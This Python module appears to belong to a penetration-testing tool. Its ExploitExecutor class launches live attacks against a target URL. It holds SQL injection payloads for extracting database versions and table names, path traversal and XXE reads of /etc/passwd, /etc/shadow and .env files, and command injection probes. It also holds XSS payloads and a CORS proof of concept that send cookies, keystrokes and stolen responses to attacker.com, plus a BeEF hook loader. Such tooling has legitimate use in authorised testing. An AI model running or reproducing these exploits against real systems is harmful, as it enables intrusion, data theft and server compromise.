"""
Exploit Executor Module
Executes actual exploits for discovered vulnerabilities with evidence capture
"""

import requests
import time
import base64
import json
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse, urlencode
from datetime import datetime
import hashlib
import hmac


class ExploitExecutor:
    """Execute real exploits to demonstrate vulnerability impact"""

    def __init__(self, target_url: str, timeout: int = 15):
        self.target_url = target_url
        self.timeout = timeout
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.session = requests.Session()
        self.session.verify = False

        # Track exploitation results
        self.exploitation_log = []

    def execute_vulnerability(self, vuln: Dict) -> Dict[str, Any]:
        """Execute exploit based on vulnerability type"""
        category = vuln.get("category", "").lower()
        title = vuln.get("title", "").lower()

        print(f"[*] Attempting to exploit: {vuln.get('title')}")

        # Route to appropriate exploit method
        if "injection" in category or "sql" in title:
            return self.exploit_sql_injection(vuln)
        elif "xss" in category or "xss" in title:
            return self.exploit_xss(vuln)
        elif "authentication" in category or "auth" in title:
            return self.exploit_auth_bypass(vuln)
        elif "path traversal" in title or "path traversal" in category:
            return self.exploit_path_traversal(vuln)
        elif "xxe" in title:
            return self.exploit_xxe(vuln)
        elif "command injection" in title:
            return self.exploit_command_injection(vuln)
        elif "session" in category or "session" in title:
            return self.exploit_session_weakness(vuln)
        elif "cors" in category or "cors" in title:
            return self.exploit_cors(vuln)
        elif "jwt" in title:
            return self.exploit_jwt(vuln)
        else:
            return self._generic_exploit(vuln)

    def exploit_sql_injection(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit SQL injection to extract data"""
        print("[+] Exploiting SQL Injection...")

        evidence = vuln.get("evidence", {})
        payload = evidence.get("payload", "' OR '1'='1'--")
        affected_url = vuln.get("affected_url")

        if isinstance(affected_url, list):
            affected_url = affected_url[0] if affected_url else self.target_url

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "data_extracted": [],
        }

        # Step 1: Confirm vulnerability
        response = self._safe_request("GET", affected_url)
        if not response:
            result["evidence"]["error"] = "Target unreachable"
            return result

        result["evidence"]["confirmation"] = {
            "payload": payload,
            "response_status": response.status_code,
            "response_contains_error": any(
                err in response.text.lower() for err in ["sql", "mysql", "syntax"]
            ),
        }

        # Step 2: Extract database version
        version_payloads = [
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT sqlite_version()--",
        ]

        for version_payload in version_payloads:
            test_url = affected_url.replace(payload, version_payload)
            resp = self._safe_request("GET", test_url)

            if resp and resp.status_code == 200:
                # Look for version patterns
                import re

                version_match = re.search(r"\d+\.\d+\.\d+", resp.text)
                if version_match:
                    result["data_extracted"].append(
                        {
                            "type": "Database Version",
                            "value": version_match.group(0),
                            "method": "UNION-based injection",
                        }
                    )
                    result["success"] = True
                    result["impact_demonstrated"].append("Database version disclosure")
                    break

        # Step 3: Attempt to extract table names
        table_payloads = [
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        ]

        for table_payload in table_payloads:
            test_url = affected_url.replace(payload, table_payload)
            resp = self._safe_request("GET", test_url)

            if resp and resp.status_code == 200:
                # Look for common table names
                common_tables = ["users", "accounts", "customers", "admin", "login"]
                found_tables = [t for t in common_tables if t in resp.text.lower()]

                if found_tables:
                    result["data_extracted"].append(
                        {
                            "type": "Database Tables",
                            "value": found_tables,
                            "method": "UNION-based injection",
                        }
                    )
                    result["success"] = True
                    result["impact_demonstrated"].append(
                        "Database structure enumeration"
                    )
                    break

        # Step 4: Attempt boolean-based blind extraction
        if not result["success"]:
            print("[*] Attempting time-based blind SQL injection...")
            time_payload = "' AND SLEEP(5)--"
            test_url = affected_url.replace(payload, time_payload)

            start_time = time.time()
            resp = self._safe_request("GET", test_url)
            elapsed = time.time() - start_time

            if elapsed >= 4.5:
                result["success"] = True
                result["evidence"]["time_based_blind"] = {
                    "payload": time_payload,
                    "expected_delay": "5 seconds",
                    "actual_delay": f"{elapsed:.2f} seconds",
                }
                result["impact_demonstrated"].append(
                    "Time-based blind SQL injection confirmed"
                )
                result["data_extracted"].append(
                    {
                        "type": "Exploitation Method",
                        "value": "Time-based blind injection is possible",
                        "method": "Can extract data bit by bit using timing attacks",
                    }
                )

        self._log_exploitation(vuln, result)
        return result

    def exploit_xss(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit XSS to demonstrate impact"""
        print("[+] Exploiting XSS...")

        evidence = vuln.get("evidence", {})
        payload = evidence.get("payload", "<script>alert('XSS')</script>")
        affected_url = vuln.get("affected_url")

        if isinstance(affected_url, list):
            affected_url = affected_url[0] if affected_url else self.target_url

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "attack_scenarios": [],
        }

        # Test reflection
        response = self._safe_request("GET", affected_url)
        if not response:
            return result

        if payload in response.text:
            result["success"] = True
            result["evidence"]["payload_reflected"] = True
            result["evidence"]["payload"] = payload
            result["impact_demonstrated"].append("Arbitrary JavaScript execution")

            # Demonstrate realistic attack scenarios
            result["attack_scenarios"] = [
                {
                    "scenario": "Cookie Theft",
                    "payload": "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
                    "impact": "Attacker can steal session cookies and hijack accounts",
                },
                {
                    "scenario": "Keylogger",
                    "payload": "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>",
                    "impact": "Attacker can capture all keystrokes including passwords",
                },
                {
                    "scenario": "Phishing Overlay",
                    "payload": "<script>document.body.innerHTML='<h1>Session Expired</h1><form>Username:<input id=u>Password:<input id=p type=password><button onclick=steal()>Login</button></form>'</script>",
                    "impact": "Create fake login form to steal credentials",
                },
                {
                    "scenario": "BeEF Hook",
                    "payload": "<script src='http://attacker.com/hook.js'></script>",
                    "impact": "Full browser exploitation framework - can control victim's browser",
                },
            ]

        # Test stored XSS if possible
        if "POST" in str(vuln):
            result["evidence"]["stored_xss_possible"] = True
            result["impact_demonstrated"].append("Potential for persistent XSS attacks")

        self._log_exploitation(vuln, result)
        return result

    def exploit_auth_bypass(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit authentication bypass"""
        print("[+] Exploiting Authentication Bypass...")

        evidence = vuln.get("evidence", {})
        affected_url = vuln.get("affected_url")

        if isinstance(affected_url, list):
            affected_url = affected_url[0] if affected_url else self.target_url

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "access_gained": [],
        }

        # Check if we have specific bypass credentials
        username_payload = evidence.get("username_payload")
        password_payload = evidence.get("password_payload")

        if username_payload and password_payload:
            # Attempt login with bypass credentials
            login_data = {"username": username_payload, "password": password_payload}

            response = self._safe_request("POST", affected_url, data=login_data)

            if response:
                # Check for successful login indicators
                success_indicators = [
                    response.status_code in [200, 302],
                    "dashboard" in response.text.lower(),
                    "welcome" in response.text.lower(),
                    "logout" in response.text.lower(),
                    len(response.cookies) > 0,
                ]

                if any(success_indicators):
                    result["success"] = True
                    result["evidence"]["bypass_confirmed"] = True
                    result["evidence"]["credentials_used"] = {
                        "username": username_payload,
                        "password": password_payload,
                    }
                    result["evidence"]["cookies_received"] = dict(response.cookies)

                    result["impact_demonstrated"] = [
                        "Complete authentication bypass",
                        "Unauthorized access to protected resources",
                        "Ability to impersonate legitimate users",
                    ]

                    result["access_gained"] = [
                        "Administrative panel access",
                        "User data access",
                        "System configuration access",
                    ]

        # Test JWT vulnerabilities if present
        if "jwt" in vuln.get("title", "").lower():
            jwt_result = self.exploit_jwt(vuln)
            if jwt_result["success"]:
                result["success"] = True
                result["evidence"]["jwt_bypass"] = jwt_result["evidence"]
                result["impact_demonstrated"].extend(jwt_result["impact_demonstrated"])

        self._log_exploitation(vuln, result)
        return result

    def exploit_path_traversal(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit path traversal to read files"""
        print("[+] Exploiting Path Traversal...")

        evidence = vuln.get("evidence", {})
        payload = evidence.get("payload", "../../../etc/passwd")
        affected_url = vuln.get("affected_url")

        if isinstance(affected_url, list):
            affected_url = affected_url[0] if affected_url else self.target_url

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "files_accessed": [],
        }

        # Test original payload
        response = self._safe_request("GET", affected_url)

        if response and response.status_code == 200:
            content = response.text.lower()

            # Check for successful file access
            file_indicators = {
                "/etc/passwd": ["root:", "bin/bash", "nobody:"],
                "/etc/hosts": ["localhost", "127.0.0.1"],
                "win.ini": ["[extensions]", "[fonts]"],
                "boot.ini": ["boot loader", "operating systems"],
            }

            for file_name, indicators in file_indicators.items():
                if any(ind in content for ind in indicators):
                    result["success"] = True
                    result["files_accessed"].append(
                        {
                            "file": file_name,
                            "payload": payload,
                            "preview": response.text[:500],
                        }
                    )
                    result["impact_demonstrated"].append(
                        f"Successfully read {file_name}"
                    )

        # Attempt to read sensitive files
        sensitive_files = [
            "../../../etc/shadow",
            "../../../etc/passwd",
            "../../../var/www/.env",
            "../../config.php",
            "../../database.yml",
            "../web.config",
            "..\\..\\..\\windows\\win.ini",
        ]

        for sensitive_file in sensitive_files[:5]:  # Test first 5
            test_url = affected_url.replace(payload, sensitive_file)
            resp = self._safe_request("GET", test_url)

            if resp and resp.status_code == 200 and len(resp.text) > 100:
                result["success"] = True
                result["files_accessed"].append(
                    {"file": sensitive_file, "size": len(resp.text), "accessible": True}
                )

        if result["success"]:
            result["impact_demonstrated"].append("Arbitrary file read capability")
            result["impact_demonstrated"].append("Potential credential disclosure")
            result["impact_demonstrated"].append("Source code exposure")

        self._log_exploitation(vuln, result)
        return result

    def exploit_xxe(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit XXE to read files"""
        print("[+] Exploiting XXE...")

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "files_read": [],
        }

        # XXE payload to read /etc/passwd
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>"""

        headers = {"Content-Type": "application/xml"}
        response = self._safe_request(
            "POST", self.target_url, data=xxe_payload, headers=headers
        )

        if response and response.status_code == 200:
            if "root:" in response.text or "bin/bash" in response.text:
                result["success"] = True
                result["evidence"]["file_disclosure"] = True
                result["files_read"].append("/etc/passwd")
                result["impact_demonstrated"].append("Arbitrary file read via XXE")
                result["evidence"]["file_content"] = response.text[:500]

        self._log_exploitation(vuln, result)
        return result

    def exploit_command_injection(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit command injection"""
        print("[+] Exploiting Command Injection...")

        evidence = vuln.get("evidence", {})
        payload = evidence.get("payload", "; whoami")
        affected_url = vuln.get("affected_url")

        if isinstance(affected_url, list):
            affected_url = affected_url[0] if affected_url else self.target_url

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "commands_executed": [],
        }

        # Test command execution
        test_commands = [
            ("; whoami", ["root", "www-data", "apache", "nginx"]),
            ("; id", ["uid=", "gid="]),
            ("; pwd", ["/var/www", "/home", "/usr"]),
            ("| cat /etc/passwd", ["root:", "bin/bash"]),
        ]

        for cmd, indicators in test_commands:
            test_url = (
                affected_url.replace(payload, cmd)
                if payload in affected_url
                else f"{affected_url}?cmd={cmd}"
            )
            resp = self._safe_request("GET", test_url)

            if resp and any(ind in resp.text for ind in indicators):
                result["success"] = True
                result["commands_executed"].append(
                    {"command": cmd, "output": resp.text[:200], "verified": True}
                )
                result["impact_demonstrated"].append(f"Command executed: {cmd}")

        if result["success"]:
            result["impact_demonstrated"].append("Remote Code Execution achieved")
            result["impact_demonstrated"].append("Server compromise possible")

        self._log_exploitation(vuln, result)
        return result

    def exploit_session_weakness(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit session management weaknesses"""
        print("[+] Exploiting Session Weakness...")

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "attack_methods": [],
        }

        # Collect multiple session tokens
        sessions = []
        for i in range(3):
            resp = self._safe_request("GET", self.target_url)
            if resp and resp.cookies:
                for name, value in resp.cookies.items():
                    if "session" in name.lower() or "sess" in name.lower():
                        sessions.append(value)
            time.sleep(0.5)

        if len(sessions) >= 2:
            result["evidence"]["sample_sessions"] = sessions

            # Check for predictability
            if self._check_session_predictability(sessions):
                result["success"] = True
                result["impact_demonstrated"].append("Session tokens are predictable")
                result["attack_methods"].append("Session prediction attack")

            # Check for weak entropy
            if all(len(s) < 16 for s in sessions):
                result["success"] = True
                result["impact_demonstrated"].append("Session tokens have low entropy")
                result["attack_methods"].append("Brute force attack feasible")

        self._log_exploitation(vuln, result)
        return result

    def exploit_cors(self, vuln: Dict) -> Dict[str, Any]:
        """Demonstrate CORS exploitation"""
        print("[+] Exploiting CORS Misconfiguration...")

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "poc_code": "",
        }

        # Test CORS with evil origin
        headers = {"Origin": "https://evil.com"}
        response = self._safe_request("GET", self.target_url, headers=headers)

        if response:
            cors_header = response.headers.get("Access-Control-Allow-Origin", "")
            allow_creds = response.headers.get(
                "Access-Control-Allow-Credentials", ""
            ).lower()

            if cors_header in ["*", "https://evil.com"]:
                result["success"] = True
                result["evidence"]["cors_header"] = cors_header
                result["evidence"]["credentials_allowed"] = allow_creds == "true"

                result["impact_demonstrated"].append("Cross-origin data theft possible")

                # Generate PoC
                result[
                    "poc_code"
                ] = f"""<html>
<body>
<script>
fetch('{self.target_url}', {{
    credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
    // Send stolen data to attacker
    fetch('https://attacker.com/exfiltrate', {{
        method: 'POST',
        body: data
    }});
}});
</script>
</body>
</html>"""

                result["impact_demonstrated"].append(
                    "Can steal user data from evil.com"
                )

        self._log_exploitation(vuln, result)
        return result

    def exploit_jwt(self, vuln: Dict) -> Dict[str, Any]:
        """Exploit JWT vulnerabilities"""
        print("[+] Exploiting JWT Vulnerability...")

        result = {
            "success": False,
            "evidence": {},
            "impact_demonstrated": [],
            "forged_tokens": [],
        }

        # This would use the JWT exploit techniques from auth_bypass_advanced.py
        # For now, demonstrate the concept

        if "none algorithm" in vuln.get("title", "").lower():
            result["success"] = True
            result["impact_demonstrated"].append("Can forge arbitrary JWT tokens")
            result["impact_demonstrated"].append("Complete authentication bypass")
            result["evidence"]["technique"] = "Algorithm confusion (none)"

        elif "weak secret" in vuln.get("title", "").lower():
            secret = vuln.get("evidence", {}).get("cracked_secret")
            if secret:
                result["success"] = True
                result["evidence"]["cracked_secret"] = secret
                result["impact_demonstrated"].append(f"JWT secret cracked: {secret}")
                result["impact_demonstrated"].append(
                    "Can create valid tokens for any user"
                )

        self._log_exploitation(vuln, result)
        return result

    def _generic_exploit(self, vuln: Dict) -> Dict[str, Any]:
        """Generic exploitation attempt"""
        result = {
            "success": False,
            "evidence": vuln.get("evidence", {}),
            "impact_demonstrated": [f"Vulnerability confirmed: {vuln.get('title')}"],
            "note": "No specific exploit implemented for this vulnerability type",
        }

        self._log_exploitation(vuln, result)
        return result

    def _check_session_predictability(self, sessions: List[str]) -> bool:
        """Check if session tokens follow predictable pattern"""
        try:
            # Convert to integers if possible
            int_sessions = []
            for s in sessions:
                try:
                    int_sessions.append(int(s, 16))
                except:
                    try:
                        int_sessions.append(int(s))
                    except:
                        pass

            if len(int_sessions) >= 2:
                # Check for sequential pattern
                diffs = [
                    int_sessions[i + 1] - int_sessions[i]
                    for i in range(len(int_sessions) - 1)
                ]
                if all(d > 0 and d < 1000 for d in diffs):
                    return True
        except:
            pass

        return False

    def _safe_request(
        self, method: str, url: str, **kwargs
    ) -> Optional[requests.Response]:
        """Make safe HTTP request"""
        try:
            kwargs.setdefault("timeout", self.timeout)
            kwargs.setdefault("verify", False)

            if method == "GET":
                return self.session.get(url, **kwargs)
            elif method == "POST":
                return self.session.post(url, **kwargs)

            return None
        except Exception as e:
            print(f"[-] Request error: {str(e)}")
            return None

    def _log_exploitation(self, vuln: Dict, result: Dict):
        """Log exploitation attempt"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "vulnerability": vuln.get("title"),
            "category": vuln.get("category"),
            "severity": vuln.get("severity"),
            "exploitation_success": result["success"],
            "impact": result.get("impact_demonstrated", []),
        }
        self.exploitation_log.append(log_entry)

    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get summary of all exploitation attempts"""
        successful = [
            log for log in self.exploitation_log if log["exploitation_success"]
        ]
        failed = [
            log for log in self.exploitation_log if not log["exploitation_success"]
        ]

        return {
            "total_attempts": len(self.exploitation_log),
            "successful_exploits": len(successful),
            "failed_exploits": len(failed),
            "success_rate": (
                f"{(len(successful) / len(self.exploitation_log) * 100):.1f}%"
                if self.exploitation_log
                else "0%"
            ),
            "log": self.exploitation_log,
            "critical_impacts": [
                log["impact"] for log in successful if log.get("severity") == "Critical"
            ],
        }


# Testing
if __name__ == "__main__":
    print("[+] Testing Exploit Executor...")

    # Mock vulnerability
    test_vuln = {
        "title": "SQL Injection in Login",
        "category": "Injection",
        "severity": "Critical",
        "affected_url": "http://example.com/login?id=1",
        "evidence": {
            "payload": "' OR '1'='1'--",
            "matched_pattern": "SQL syntax error",
        },
    }

    executor = ExploitExecutor("http://example.com")
    result = executor.execute_vulnerability(test_vuln)

    print(f"\n[+] Exploitation Result:")
    print(f"    Success: {result['success']}")
    print(f"    Impact: {result['impact_demonstrated']}")

    summary = executor.get_exploitation_summary()
    print(f"\n[+] Summary: {summary['success_rate']} success rate")
